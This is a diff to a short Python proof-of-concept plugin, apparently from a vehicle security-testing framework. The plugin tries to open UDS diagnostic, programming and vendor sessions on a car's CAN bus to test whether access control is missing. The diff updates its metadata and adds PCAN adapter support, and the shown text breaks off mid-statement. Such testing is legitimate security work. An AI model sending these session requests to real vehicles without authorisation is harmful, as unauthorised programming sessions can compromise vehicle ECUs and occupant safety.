@@ -1,24 +1,27 @@
 """
 PoC Name: UDS Diagnostic Session Bypass
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: UDS Protocol (ISO 14229)
+Category: Protocol
 Severity: High
 CVSS: 7.5
-Description: 尝试UDS 0x10直接进入扩展诊断/编程会话
-Prerequisites: SocketCAN接口, python-can库。
-Usage: python3 26_UDS_DiagSession_Bypass.py <can_interface>
+Description: 尝试通过UDS 0x10服务直接进入扩展诊断会话,检测是否缺少访问控制。
+Prerequisites: PCAN接口, python-can库, PCAN驱动。
+Usage: python3 26_UDS_DiagSession_Bypass.py PCAN_USBBUS1
 """
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
 class UDSDiagSessionPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self): return True
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"UDS诊断会话测试 ({iface})...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             sessions = [(0x02, "Programming"), (0x03, "ExtendedDiag"), (0x60, "Vendor")]
             for sub, name in sessions:
                 msg = can.Message(arbitration_id=0x7E0,
